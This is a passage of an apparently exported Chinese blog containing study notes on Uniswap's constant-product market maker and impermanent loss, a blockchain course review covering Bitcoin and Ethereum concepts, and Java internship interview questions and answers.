<p>还是以上面的DAI和ETH为例。当50个DAI换1个ETH时，我存入50个 DAI 和1个 ETH。假设现在行情变化，也就是DAI和ETH的兑换比例变化了：不管现在是50个DAI换2个ETH（ETH跌了），还是100个DAI换1个ETH（ETH涨了），流动性提供者如果想赎回资金，都必须按照现在的兑换比例，取出价格相等的DAI和ETH，不能破坏资金池中2种代币的比例平衡，不然套利者就又要出动了。这也就是说，流动性提供者取出来的不是存入的50 DAI和1个ETH，而是按照新的市价的兑换比例，而这相比我直接持有50 DAI和1个ETH不动，有可能会产生损失。</p>
<p>impermanent loss</p>
<p>向Uniswap中提供流动性的人会发现一个现象：“目前在流动池中资金的价值比放入流动池之前的资金价值少了，也就是资金缩水了”，这种现象被称为“impermanent loss”，impermanent loss，中文翻译成“无常损失”，简单来说impermanent loss是指你将加密货币放入uniswap中赚取的收益与你将加密货币放入钱包中的收益之间的差。</p>
<p>hold指不看币价涨跌长期持有某种加密货币（hold on for dear life）</p>
<p>impermanent loss通常是由于流动池中的价格发生波动引起的，下面看一个例子： </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233127.jpg" alt="img"></p>
<p>可以看出价格从100变成120后我们的资金只有之前的99.59%，损失了0.4%左右。只要这时候我们不将资金从流动池中取出，一旦流动池中的币价回到100时，我们是没有损失的，这是为什么叫impermanent loss无常损失的原因。</p>
<p>下图演示impermanent loss的比率与当前价格变化的关系，O列表示资金刚放入流动池的情况，O-&gt;H表示价格上涨时impermanent loss的变化，A&lt;-O表示价格下跌时impermanent loss的变化。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233128.jpg" alt="img"></p>
<p>下图是根据上面数据画出的函数图像，蓝色的曲线是不包含手续费的，黄色的图像包含手续费，红色的线条是为了方便说明。</p>
<p>先看蓝色曲线，当不计算手续费收益的情况下，无论币价上涨或下跌，流动性提供者100%会有损失。</p>
<p>再看黄色的曲线，由于黄色曲线是计算手续费收益的，所以只要币价在一个范围内波动，流动性提供者可以稳赚手续费收益。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233129.jpg" alt="img"></p>
<p>由此可以得出一个结论要介绍impermanent loss对流动性提供者的影响，可以为两个币价之间波动小的流动池提供流动性。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233130.jpg" alt="img"></p>
<p>· mean-reverting pairs：均值回归的交易对，比如稳定币交易对两者波动是最小的，可以最大程度减少impermanent loss · correlated pairs：有正相关性的交易对，例如ETH&#x2F;ZRX，这两个币的波动方向基本上是一致的，同涨同跌，两者之间的相对波动小 · Uncorrelated pairs：非相关性的交易对，如ETH&#x2F;D<a href="https://link.zhihu.com/?target=http://jizhid.com/number/ai/">AI</a>，为这种交易对提供流动性，赚取的交易费有可能会覆盖impermanent loss · Inverse correlated pairs：负相关的交易对，是最危险的，他们之间波动方向相反，两者之间的相对波动范围最大。</p>
<p>下面是计算impermanent loss的公式 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233131.jpg" alt="img"></p>
<hr>
<p>看公式，相当于是对之前例子的抽象。</p>
<p>不考虑手续费的计算公式：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233123.jpg" alt="img"></p>
<p>对于不理解上面公式的同学，可以参考以下表格中的数据自己在excel中手动演算一遍，可以更直观的理解Uniswap的工作原理。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233124.jpg" alt="img"></p>
<p>加入手续费的恒定乘积公式：以下过程是在计算手续费的情况下，将上面的公式重新推导了一遍。计算交易价格 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233125.jpg" alt="img"></p>
<p>上面的公式中， $\alpha$是真实的买家的付出的比例；但是在计算y值的时候，去除了手续费，因此，得到更多的y值。也即</p>
<p>$(1+\alpha)*(1-\beta)&#x3D;1$</p>
<p>变成了</p>
<p>$(1+\alpha\gamma)*(1-\beta)&#x3D;1$</p>
<p>所以,$\alpha$和$\beta$的关系就从</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}$</p>
<p>变成了</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}\frac{1}{\gamma}$</p>
<p>除了在有交易手续费的情况会变大，还有一个情况也会使k值产生变化，当向流动池中增加流动性的时候k会变大，当从流动池中取回流动资金时k会变小。具体变化比例可以参考Uniswap白皮书。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233126.jpg" alt="img"></p>
<p><strong>总结</strong></p>
<p>优点</p>
<p>完全去中心化，不依赖第三方，任何人都可以基于uniswap构建自己的应用<br>可以自由地创建任何ERC20交易对<br>与其他去中心化交易所相比gas费用更低<br>任何人都可以向uniswap流动池中提供流动性，人人都可以是做市商</p>
<p>缺点</p>
<p>需要依赖套利者去平衡uniswap与外部交易所之间的汇率<br>对大户不友好，进行大额的交易会造成很大的滑点 </p>
<hr>
<p>了解Uniswap的原理之后，再来看一下疯狂的币圈。</p>
<p>Uniswap的恒定乘积机制决定了，哪一边的买入数量多，价格就会上升，同时如果买入的越晚，上涨的幅度则越快。所以，一旦一个Uniswap的代币进入了大多数人的视野，不断上涨的币价让追涨杀跌的韭菜们争先恐后的买入，从而进一步推动价格上涨，直到没有人再买了，就开启同样的快速下跌过程。CoinGecko数据显示，从5月30日到6月5日，STA币价从几乎为空气价的0.00001元一路涨至约1元，上涨约10万倍。然后又快速下跌。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233132.jpg" alt="img"></p>
<p><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619www.chainnode.com</a><a href="https://link.zhihu.com/?target=https://www.qklw.com/top/20200710/100667.html">Uniswap上庄家的收割套路 - 区块链网www.qklw.com<img src="https://pic3.zhimg.com/v2-64e626cb3c3ecd6faa0c616a08cddc62_ipico.jpg" alt="图标"></a></p>
<p>参考：</p>
<ol>
<li><a href="https://zhuanlan.zhihu.com/p/167023364">https://zhuanlan.zhihu.com/p/167023364</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/167023364">https://zhuanlan.zhihu.com/p/167023364</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/611741523815.htm">https://www.chainnews.com/articles/611741523815.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/79dbc73f8de4">https://www.jianshu.com/p/79dbc73f8de4</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.hulianmaibo.com/posts/info/13110">https://www.hulianmaibo.com/posts/info/13110</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.okex.com/academy/zh/taking-uniswap-curve-balancer-as-an-example-detailed-analysis-of-automatic-market-maker-amm-cn">https://www.okex.com/academy/zh/taking-uniswap-curve-balancer-as-an-example-detailed-analysis-of-automatic-market-maker-amm-cn</a> 【感觉不对；而且uniswap交易所也会跑路】</li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/cortexlabs/defi%E7%A7%91%E6%99%AE%E7%B3%BB%E5%88%97%E4%B9%8B-%E4%B8%80-uniswap%E5%88%B0%E5%BA%95%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%BD%AC%E7%9A%84-2a82c9afc1df">https://medium.com/cortexlabs/defi%E7%A7%91%E6%99%AE%E7%B3%BB%E5%88%97%E4%B9%8B-%E4%B8%80-uniswap%E5%88%B0%E5%BA%95%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%BD%AC%E7%9A%84-2a82c9afc1df</a></li>
<li><a href="https://link.zhihu.com/?target=http://jizhid.com/number/blockchain/45304.html">http://jizhid.com/number/blockchain/45304.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cailu.net/article/13113111130466711.html">https://www.cailu.net/article/13113111130466711.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/zdz8207/p/qkl-Uniswap.html">https://www.cnblogs.com/zdz8207/p/qkl-Uniswap.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/media/621174">https://www.8btc.com/media/621174</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2018/01/12/create_token/">https://learnblockchain.cn/2018/01/12/create_token&#x2F;</a> 以太坊代币</li>
</ol>
<h1 id="区块链技术复习"><a href="#区块链技术复习" class="headerlink" title="区块链技术复习"></a>区块链技术复习</h1><h2 id="gas的目的"><a href="#gas的目的" class="headerlink" title="gas的目的"></a>gas的目的</h2><p>以太坊中实现的脚本语言是图灵完备的,gas的引入可以防止用户在脚本中写死循环来坑矿工.</p>
<p>gas的目的是限制执行交易所需的工作量，同时为执行支付费用。gas 用来衡量你的这笔交易（或者合约代码调用）所消耗的资源（包括计算量，存储，带宽等）。除了计算交易的费用外,交易或者合约上传也需要费用.一笔交易所产生的转账费用会奖励给打包包含这笔交易的区块的矿工。区块不是哪个矿工产生的，所有的矿工都会竞争下一个区块的打包权，胜出者可以打包下一个区块。交易不一定会存在一个区块，它交易被广播出去后，在数秒内全网所有的节点都会接收到这笔交易。矿工会优先打包 gas 合理，gas price 高的交易。如果用户交易时所支付的矿工费非常低(out of gas), 那么这笔交易可能不会被矿工打包, 从而造成交易失败。交易运行完毕,如果有剩余,再退还给用户,如果不够,矿工也不还钱,只是把交易全部回滚</p>
<p>如果该交易需要使用的gas数量小于或等于所设置的gas limit，那么这个交易会被成功处理。如果gas总消耗超过gas limit，那么所有的操作都会被复原（回滚），但是交易费仍然会被矿工收取。区块链会显示这笔交易完成尝试，但因为没有提供足够的gas导致所有的合约命令都被复原。</p>
<p>为了克服拒绝服务和无限循环，使用0.00001以太币或1 Gas用于执行一行代码。如果没有足够的以太币，交易不会被执行。它也是为了促进代码设计者提高效率，而不是浪费带宽和CPU的利用率。</p>
<p>以太坊的交易费用&#x3D; gas 数量 * gas price (gas 单价, 以太币计价) </p>
<h4 id="为什么需要多个hash函数呢？"><a href="#为什么需要多个hash函数呢？" class="headerlink" title="为什么需要多个hash函数呢？"></a>为什么需要多个hash函数呢？</h4><p>降低误判率</p>
<p>如果哈希函数的个数多，那么在对一个不属于集合的元素进行查询时得到0的概率就大；但另一方面，如果哈希函数的个数少，那么位数组中的0就多。</p>
<p>区块链技术提供了一种交易记录和执行的新的形式，具有去中心化、不可篡改和抵赖等优秀的性质，在金融和公共事务方面有着巨大的潜力应用。目前为止，区块链最成功的应用仍然是比特币，因此，课程中，我们主要以比特币为例子来讲解区块链。主要介绍了区块链中最基本和最重要的概念：分布式记账、共识机制、区块（Merkle树）、脚本等。在延伸介绍区块链2.0以太坊时，涉及了以太坊的特点、以太坊上智能合约的编写，以及区块链安全，特别是智能合约的安全。最后，介绍了以太坊上去中心化代币兑换协议uniswap。【最后，提及区块链3.0，讨论了PoW、PoS和DPoS的特点和区别。2020年没讲】</p>
<p>首先，我们讨论了数字货币的概念，通过回顾人类史上货币的发展历程，讨论货币的特点，它可以不具有实体、本质特征是账本上记录的交易。为了让金融系统公开、公正、不可篡改，需要一个分布式的具有不可篡改的记账系统。</p>
<p>在这样的分布式记账系统的发展过程中，出现了很多优秀的思想，例如CyberPunk曾先后提出的ecash、hashcash和B-money，比特币也是在这些尝试的基础上发展而来。ecash提出了盲签的概念，“这是第一次有人认为数字本身是有价值的，这个想法是你可以通过盲签名方法来获得这些数字，且没人知道你得到的是哪个数字，但他们知道这些是有价值的数字，银行会兑现他们的款项。”HashCash中提出了工作量证明的方法，“使用部分哈希的想法是它们可以被任意地设置为昂贵的计算成本，但是可以对其立即进行验证”。B-money中提出了公共账簿和使用公钥作为身份标识的方法，交易通过网络向所有节点进行广播。</p>
<p>分布式的、不可篡改、而且防止双重支付的公共账本的思想需要有强有力的技术支撑。区块链中依赖于密码学的技术，哈希和非对称加密。</p>
<p>比特币区块链中使用的哈希算法是SHA-256，它有一些很好的特性，如确定性、快速计算、隐藏性、雪崩效应以及抗冲突。哈希在区块链中的应用是工作量证明，在区块链中的节点为了争取到记账的权利，需要进行大量的哈希运算，找到满足条件的随机数，才能形成链上的区块。</p>
<p>比特币区块链中使用的非对称加密的算法是椭圆曲线。当前应用较广的非对称加密算法是RSA。课上我们详细介绍了RSA中公私密钥对生成的方法，以及使用RSA进行身份认证以及加密传输的过程。</p>
<p>接下来我们讨论了比特币中的共识机制PoW。共识机制本质上就是要保证所有节点认可的账本是唯一的。做到这一点，在中心化的系统中很容易，但是在分布式系统中，必须要考虑到参与节点的故障可能以及潜在的恶意攻击者的情况。在区块链上，所有的交易向所有的节点广播，矿工收到的交易的内容和顺序都可能不同；而且出块有奖励的情况下，所有的节点都会尽量出块。那么由哪个节点产生区块以及如何防止恶意节点攻击（如拒绝服务、双重支付等）？PoW通过让参与节点进行算力的竞争，使得在大部分的节点是诚实节点的情况下，DoS攻击以及双重支付攻击不会成功（支付等待6次确认）；即使有节点真正掌握了51%的算力，考虑到控制算力的巨大投入，节点也会主动维持区块链的正常运行。</p>
<p>在产生区块之后，接下来就是要理解区块上记录的内容。区块上的内容主要是一笔笔的交易。由于缺少对全局数据（如余额）的支持，比特币并没有采用基于账户的方式来表示交易，而是以UTXO（Unspent Transaction Output），将之前交易的输出作为新交易的输入。我们详细地察看了交易的具体内容，并介绍了输出位置上的ScriptPubKey以及输入部分的ScriptSig。先前交易的输出需要设置相应的条件，之后的交易必须要满足这个条件才能使用这笔输出中包含的钱。所以如果矿工在接收到交易时，将新交易中的ScriptSig和先前交易中的ScriptPubKey结合起来，能顺利运行结束返回True，那么这个交易便是合法的，可以被打包进区块。同时，因为所有的验证必须由矿工完成，为了防止矿工陷入死循环，比特币能支持的脚本语言是图灵不完备的，仅能够完成有限的操作。举一个简单的例子，如果之前交易中ScriptPubKey中设置的条件是 3 op_add 5 op_equal，那么新交易中的ScriptKey应该是什么呢？</p>
<p>考虑到比特币使用的是基于栈的操作。op_add是一个操作指令，需要有两个操作数，所以scriptSig中一定需要一个数字作为操作数。而后面的指令也很简单，需要和5进行比较操作。所以ScriptSig中需要输入2。</p>
<p>实际中常用的交易类型是P2PKH。使用P2PKH所需要的脚本是这样的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233133.jpg" alt="img"></p>
<p>除了P2PKH之外，还有其他形式的交易，如P2PK，multiSig、P2SH等。另外介绍了一个例子Time_Lock。</p>
<p>在介绍完交易之后，我们讨论了区块的头部。在区块的头部有一个数据结构，Merkle root。在比特币网络中，Merkle树被用来归纳一个区块中的所有交易，同时生成整个交易集合的数字指纹，且提供了一种校验区块是否存在某交易的高效途径。生成一棵完整的Merkle树需要递归地对哈希节点对进行哈希，并将新生成的哈希节点插入到Merkle树中，直到只剩一个哈希节点，该节点就是Merkle树的根。这里我们需要了解Merkle证明和Merkle路径是怎么回事。</p>
<p>在之后我们介绍了SPV和Bloom过滤器。这里要理解Bloom过滤器的工作特点，为什么Bloom过滤器会造成false positive而不会造成false negative？</p>
<p>接下来，结合310比特币挑战，我们重点讨论了比特币钱包，用户应该如何管理比特币。这里我们主要讨论了助记词。助记词是如何生成的呢？</p>
<p>为了生成大量的密钥对，引入了HD钱包的概念。应该理解HD钱包是如何生成大量的密钥的。</p>
<p>以上是比特币的内容。接下来，我们开始介绍以太坊。以太坊提供了远比比特币广的应用场景，主要是因为它大大提高了区块的生成速度，以及提供了图灵完备的脚本语言。为了支持这些特性，相比于比特币，它引入一些新的概念，如Gas。请问Gas的目的是什么？</p>
<p>另外，为了支持基于账户的交易的支持，以太坊维护了状态树，因为状态树需要经常更新，所以以太坊使用了MPT。要求能够根据给出的键值对，画出相应的MPT。</p>
<p>接下来重点考虑了区块链的安全问题。区块链本身可能受到攻击，以太坊上的智能合约也有可能受到攻击。【在介绍智能合约的安全问题时，我们讨论了THE DAO 和 Fomo3d的攻击。要能够理解攻击产生的原因。】</p>
<p>Uniswap是DeFi中最著名的协议之一，在其中锁定和流动着巨额的资金。重点介绍了AMM的概念、计算；包括恒定乘积、滑点、无常损失等。</p>
<hr>
<p>答疑课上的共性问题，SPV使用bloom filter进行查询的时候，会什么需要更新bloom filter？</p>
<p>BIP 37在实现时，提供了Bloom_update_none选项，也即不更新。主要是因为，随着加入项的增多，Bloom Filter的效率会变低，用户可能需要定时刷新filter。同时，提供了Bloom_update_all选项，也即上文提到的将输出中的scriptpbk中的outpoint都加入进来；另外，还提供了Bloom_update_P2PUBKEY_ONLY选项，也即仅在输出脚本是 pay-to-pubkey或者是pay to multisig形式的时候才将outpoint添加到filter中。</p>
<p>我们来分析一下这样做的道理。为啥要加入outpoint，这里我们可以理解outpoint是包括了(txid，outputid)的一个数据结构。</p>
<p>如果用户要查询他的收入的，也即需要查询所有的scriptpbk中与他相关的交易。那么来分析一下我们介绍的P2PKH、P2PK、P2multisig以及P2SH这四种交易中，分别需要提供什么信息。</p>
<p>对于P2PKH，只需要提供公钥的哈希就能查询到；对于P2PK和P2multisig，只需要提供公钥就能查询到；对于P2SH，提供脚本的哈希就能查询到。这些信息都是可以提前确认的，所以并不需要更新filter。</p>
<p>但是当用户要查询他的支出，此时也即要查询所有的scriptsig。这时候我们需要向filter中提供什么信息呢？</p>
<p>对于收款交易是P2PKH的情况，只需要提供公钥就能查询到；对于收款交易是P2SH的情况，提供就能查询到；这些信息都是可以提前确认的，所以并不需要更新filter。但是对于P2PK和P2multisig呢？为了从这两种交易中赎出钱，需要提供的是签名，但是签名并不能提前确认；在这个scriptsig中能够确认的就是它是从哪里赎出的钱，也即outpoint，所以，需要向filter中添加这些信息。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>比特币</tag>
        <tag>以太坊</tag>
      </tags>
  </entry>
  <entry>
    <title>实习面试</title>
    <url>/2021/12/21/%E9%9D%A2%E8%AF%95/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<h1 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h4 id="内部类的优点和缺点"><a href="#内部类的优点和缺点" class="headerlink" title="内部类的优点和缺点"></a>内部类的优点和缺点</h4><p>可以被private和protected修饰</p>
<ul>
<li>优点: 内部类可以随意使用外部类的成员变量（包括私有）而不用生成外部类的对象，这也是内部类的唯一优点。</li>
<li>缺点: 破坏了原有类的程序结构</li>
</ul>
<h4 id="switch-是否能作用在-byte-long-String"><a href="#switch-是否能作用在-byte-long-String" class="headerlink" title="switch 是否能作用在 byte,long,String"></a>switch 是否能作用在 byte,long,String</h4><p>Java 5 以前，switch(expr)中，expr 只能是 byte、short、char、int</p>
<p>从  Java5 开始，expr 可以是 enum 类型</p>
<p>从 Java 7  开始，expr 还可以是字符串（String）</p>
<p>长整型（long）在目前所有的版本中都是不可以的</p>
<h4 id="Java语言采用何种编码方案？有何特点？"><a href="#Java语言采用何种编码方案？有何特点？" class="headerlink" title="Java语言采用何种编码方案？有何特点？"></a>Java语言采用何种编码方案？有何特点？</h4><p>Unicode（标准码）: 它为每个字符制订了一 个唯一的数值，因此在任何的语言，平台，程序都可以放心的使用。</p>
<h4 id="在-Java-中，如何跳出当前的多重嵌套循环"><a href="#在-Java-中，如何跳出当前的多重嵌套循环" class="headerlink" title="在 Java 中，如何跳出当前的多重嵌套循环"></a>在 Java 中，如何跳出当前的多重嵌套循环</h4><p>在Java中，要想跳出多重循环，可以在外面的循环语句前定义一个标号，然后在里层循环体的代码中使用带有标号的break 语句，即可跳出外层循环。</p>
<h4 id="用最有效率的方法计算-2-乘以-8"><a href="#用最有效率的方法计算-2-乘以-8" class="headerlink" title="用最有效率的方法计算 2 乘以 8"></a>用最有效率的方法计算 2 乘以 8</h4><p>2 &lt;&lt; 3</p>
<h4 id="float-f-x3D-3-4-是否正确"><a href="#float-f-x3D-3-4-是否正确" class="headerlink" title="float f&#x3D;3.4;是否正确"></a>float f&#x3D;3.4;是否正确</h4><p>错,  应该写成float f &#x3D;(float)3.4或 float f &#x3D;3.4F</p>
<h4 id="short-s1-x3D-1-s1-x3D-s1-1-有错吗-short-s1-x3D-1-s1-x3D-1-有错吗"><a href="#short-s1-x3D-1-s1-x3D-s1-1-有错吗-short-s1-x3D-1-s1-x3D-1-有错吗" class="headerlink" title="short s1 &#x3D; 1; s1 &#x3D; s1 + 1;有错吗? short s1 &#x3D; 1; s1 +&#x3D; 1;有错吗"></a>short s1 &#x3D; 1; s1 &#x3D; s1 + 1;有错吗? short s1 &#x3D; 1; s1 +&#x3D; 1;有错吗</h4><p>1 是 int 类型，因此 s1+1 运算结果也是 int型，需要强制类型转换</p>
<p>s1+&#x3D; 1;相当于 s1 &#x3D; (short(s1 + 1);其中有隐含的强制类型转换</p>
<h4 id="private-default-protected-public"><a href="#private-default-protected-public" class="headerlink" title="private,default,protected,public"></a>private,default,protected,public</h4><p>private : 当前类。使用对象：变量、方法<br>default: 同包。使用对象：类、接口、变量、方法<br>protected : 同包，子类。使用对象：变量、方法<br>public : 同包，子类，其他包。使用对象：类、接口、变量、方法</p>
<p> 注意：private和protected不能修饰类（外部类）。外部类就是模版,使用private和protected修饰就没有任何意义</p>
<h4 id="3-0-1-x3D-x3D-0-3返回值是什么"><a href="#3-0-1-x3D-x3D-0-3返回值是什么" class="headerlink" title="3*0.1&#x3D;&#x3D;0.3返回值是什么"></a><strong>3*0.1&#x3D;&#x3D;0.3返回值是什么</strong></h4><p>false，因为有些浮点数不能完全精确的表示出来。</p>
<h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><p>被final修饰的方法，JVM会尝试将其内联，以提高运行效率</p>
<p>被final修饰的常量，在编译阶段会存入常量池中</p>
<p>被final修饰的类不可以被继承</p>
<p>被final修饰的方法不可以被重写; </p>
<p>被final修饰的变量不可以被改变, 被final修饰不可变的是变量的引用, 而不是引用指向的内容;</p>
<p>final不可变性的保证是靠编译器来保证的; </p>
<h4 id="java语言特点"><a href="#java语言特点" class="headerlink" title="java语言特点?"></a>java语言特点?</h4><p>简单易学; 面向对象; 跨平台; 支持多线程; 支持网络编程而且很方便(Java 语言诞生本身就是为简化网络编程设计的，因此 Java 语言不仅支持网络编程而且很方便); 编译和解释并存;</p>
<h4 id="JVM-JDK-JRE"><a href="#JVM-JDK-JRE" class="headerlink" title="JVM JDK JRE"></a>JVM JDK JRE</h4><p>jvm: 运行java字节码的虚拟机. 有针对不同系统的特定实现,使用相同的字节码,在不同系统下运行都会有相同的结果.</p>
<p>class文件到机器码: 在这一步 JVM类加载器首先加载字节码文件，然后通过解释器逐行解释执行，这种方式的执行速度会相对比较慢。而且，有些方法和代码块是经常需要被调用的(也就是所谓的热点代码)，所以后面引进了 JIT(just-in-time) 编译器，而 JIT 属于运行时编译。当 JIT 编译器完成第一次编译后，其会将字节码对应的机器码保存下来，下次可以直接使用。而我们知道，机器码的运行效率肯定是高于 Java 解释器的。这也解释了我们为什么经常会说 Java 是编译与解释共存的语言。</p>
<p>HotSpot 采用了惰性评估(Lazy Evaluation)的做法，根据二八定律，消耗大部分系统资源的只有那一小部分的代码（热点代码），而这也就是 JIT 所需要编译的部分。JVM 会根据代码每次被执行的情况收集信息并相应地做出一些优化，因此执行的次数越多，它的速度就越快。JDK 9 引入了一种新的编译模式 AOT(Ahead of Time Compilation)，它是直接将字节码编译成机器码，这样就避免了 JIT 预热等各方面的开销。JDK 支持分层编译和 AOT 协作使用。但是 ，AOT 编译器的编译质量是肯定比不上 JIT 编译器的。</p>
<p>jdk: java development kit </p>
<p>jre: java runtime environment</p>
<p>有时，即使您不打算在计算机上进行任何 Java 开发，仍然需要安装 JDK。例如，如果要使用 JSP 部署 Web 应用程序，那么从技术上讲，您只是在应用程序服务器中运行 Java 程序。那你为什么需要 JDK 呢？因为应用程序服务器会将 JSP 转换为 Java servlet，并且需要使用 JDK 来编译 servlet。</p>
<h4 id="Oracle-JDK-和-Open-JDK的对比"><a href="#Oracle-JDK-和-Open-JDK的对比" class="headerlink" title="Oracle JDK 和 Open JDK的对比"></a>Oracle JDK 和 Open JDK的对比</h4><ol>
<li>OpenJDK 是一个参考模型并且是完全开源的，而 Oracle JDK 是 OpenJDK 的一个实现，并不是完全开源的；</li>
<li>Oracle JDK 比 OpenJDK 更稳定。OpenJDK 和 Oracle JDK 的代码几乎相同，但 Oracle JDK 有更多的类和一些错误修复。因此，如果您想开发企业&#x2F;商业软件，我建议您选择 Oracle JDK，因为它经过了彻底的测试和稳定。某些情况下，有些人提到在使用 OpenJDK 可能会遇到了许多应用程序崩溃的问题，但是，只需切换到 Oracle JDK 就可以解决问题；</li>
<li>在响应性和 JVM 性能方面，Oracle JDK 与 OpenJDK 相比提供了更好的性能；</li>
<li>Oracle JDK 不会为即将发布的版本提供长期支持，用户每次都必须通过更新到最新版本获得支持来获取最新版本；</li>
<li>Oracle JDK 根据二进制代码许可协议获得许可，而 OpenJDK 根据 GPL v2 许可获得许可。</li>
</ol>
<h4 id="java和c-的区别"><a href="#java和c-的区别" class="headerlink" title="java和c++的区别?"></a>java和c++的区别?</h4><ol>
<li><p>都是面向对象的语言,都支持封装,继承,多态</p>
</li>
<li><p>java不提供指针直接访问内存,程序更加安全</p>
</li>
<li><p>java的类是单继承的,c++支持多继承,但java接口可以多继承(为了弥补不支持多继承的缺点)</p>
</li>
<li><p>java有gc,不需要程序员手动释放无用内存</p>
</li>
<li><p>在 C 语言中，字符串或字符数组最后都会有一个额外的字符’\0’来表示结束。但是，Java 语言中没有结束符这一概念。</p>
<blockquote>
<p><a href="https://blog.csdn.net/sszgg2006/article/details/49148189">https://blog.csdn.net/sszgg2006/article/details/49148189</a></p>
<p>Java里面一切都是对象，是对象的话，字符串肯定就有长度，即然有长度，编译器就可以确定要输出的字符个数，当然也就没有必要去浪费那1字节的空间用以标明字符串的结束了。比如，数组对象里有一个属性length,就是数组的长度，String类里面有方法length()可以确定字符串的长度，因此对于输出函数来说，有直接的大小可以判断字符串的边界，编译器就没必要再去浪费一个空间标识字符串的结束。<br>java和c通信的时候，由于c中的char中有结束符的，所以当java收到C发来的字符串时，后面往往会有若干空字符，如果不做处理的话，java会对其一并输出，为了将空字符处理掉不输出，可以采用如下两种方法：</p>
<p>方法一:</p>
<p>调用java字符串的trim()方法，该方法会将字符串前后的空字符都去掉。</p>
<p>方法二：</p>
<p>自己实现去掉尾部空字符的方法</p>
</blockquote>
</li>
</ol>
<h4 id="import-java和javax-的区别"><a href="#import-java和javax-的区别" class="headerlink" title="import java和javax 的区别?"></a>import java和javax 的区别?</h4><p>刚开始的时候 JavaAPI 所必需的包是 java 开头的包，javax 当时只是扩展 API 包来使用。然而随着时间的推移，javax 逐渐地扩展成为 Java API 的组成部分。但是，将扩展从 javax 包移动到 java 包确实太麻烦了，最终会破坏一堆现有的代码。因此，最终决定 javax 包将成为标准 API 的一部分。</p>
<p>所以，实际上 java 和 javax 没有区别。这都是一个名字。</p>
<h4 id="为什么说java语言“编译与解释并存”"><a href="#为什么说java语言“编译与解释并存”" class="headerlink" title="为什么说java语言“编译与解释并存”?"></a>为什么说java语言“编译与解释并存”?</h4><p>高级编程语言按照程序的执行方式分为编译型和解释型两种。简单来说，编译型语言是指编译器针对特定的操作系统将源代码一次性翻译成可被该平台执行的机器码；解释型语言是指解释器对源程序逐行解释成特定平台的机器码并立即执行。比如，<strong>你想阅读一本英文名著，你可以找一个英文翻译人员帮助你阅读， 有两种选择方式，你可以先等翻译人员将全本的英文名著（也就是源码）都翻译成汉语，再去阅读，也可以让翻译人员翻译一段，你在旁边阅读一段，慢慢把书读完。</strong></p>
<p>Java 语言既具有编译型语言的特征，也具有解释型语言的特征，因为 Java 程序要经过先编译，后解释两个步骤，由 Java 编写的程序需要先经过编译步骤，生成字节码（*.class 文件），这种字节码必须由 Java 解释器来解释执行。因此，我们可以认为 Java 语言编译与解释并存。</p>
<h4 id="字符型常量和字符串常量的区别"><a href="#字符型常量和字符串常量的区别" class="headerlink" title="字符型常量和字符串常量的区别?"></a>字符型常量和字符串常量的区别?</h4><ol>
<li><p>形式上: 字符常量是单引号引起的一个字符;字符串常量是双引号引起的0个或若干的字符</p>
</li>
<li><p>含义上: 字符常量相当于一个整形值(ASCII值),可以参与表达式的运算;字符串常量代表一个地址值(该字符串在内存中的存放位置)</p>
</li>
<li><p>占内存大小: 字符常量只占两个字节; 字符串常量占若干个字节.</p>
<blockquote>
<p>java基本类型所占存储空间的大小不像其他语言那样随机器硬件架构的变化而变化.这中所占存储空间的大小的不变的性质是java程序比其他大多数语言编写的程序更具有可移植性的原因之一.</p>
</blockquote>
</li>
</ol>
<h4 id="标识符和关键字的区别"><a href="#标识符和关键字的区别" class="headerlink" title="标识符和关键字的区别?"></a>标识符和关键字的区别?</h4><p>标识符就是一个名字。</p>
<p>关键字是被赋予特殊含义的标识符。比如警察局就是一个关键字。</p>
